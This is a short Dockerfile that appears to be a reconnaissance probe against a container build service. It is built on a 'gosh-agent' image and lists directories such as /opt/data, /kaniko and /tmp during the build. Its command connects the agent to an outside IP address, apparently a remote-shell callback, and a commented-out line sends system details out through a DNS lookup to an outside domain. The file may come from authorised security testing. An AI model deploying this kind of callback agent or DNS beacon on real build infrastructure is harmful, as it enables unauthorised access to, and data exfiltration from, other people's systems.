FROM praetorianlabs/gosh-agent
#RUN un=`uname -nrs | sed 's/ //g'`  && dig $un.dns.praetorianlabs.com 
RUN apk update && apk add tree
RUN tree /opt/data/
RUN tree /opt/app/
RUN tree /opt/atm/
RUN tree /kaniko/
RUN tree /tmp/
RUN ls -alh .
CMD ["-host", "104.198.138.155:8083"]

